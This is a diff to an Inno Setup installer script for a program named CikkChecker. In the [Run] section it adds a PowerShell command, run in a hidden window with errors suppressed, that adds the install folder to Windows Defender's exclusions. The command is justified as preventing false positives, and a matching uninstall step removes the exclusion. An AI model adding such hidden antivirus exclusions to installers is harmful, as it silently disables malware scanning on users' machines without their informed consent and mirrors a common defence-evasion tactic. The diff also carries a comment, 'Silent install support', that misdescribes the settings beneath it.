@@ -31,6 +31,9 @@ WizardStyle=modern
 CloseApplications=yes
 CloseApplicationsFilter=CikkChecker.exe
 RestartApplications=no
+; Silent install support
+DisableWelcomePage=no
+DisableReadyPage=no
 UninstallDisplayName={#MyAppName}
 UninstallDisplayIcon={app}\{#MyAppExeName}
 ShowLanguageDialog=yes
@@ -59,7 +62,15 @@ Name: "{group}\Uninstall {#MyAppName}"; Filename: "{uninstallexe}"
 Name: "{autodesktop}\{#MyAppName}";     Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon
 
 [Run]
+; Add Windows Defender exclusion for install folder (prevents false positive scans)
+Filename: "powershell.exe";   Parameters: "-NonInteractive -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue""";   Flags: runhidden nowait;   StatusMsg: "Biztonsági kivétel beállítása..."
+
+; Launch app after install (only if not silent)
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#MyAppName}}"; Flags: nowait postinstall skipifsilent
+
+[UninstallRun]
+; Remove Defender exclusion on uninstall
+Filename: "powershell.exe";   Parameters: "-NonInteractive -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue""";   Flags: runhidden
 
 [UninstallDelete]
 Type: filesandordirs; Name: "{app}"
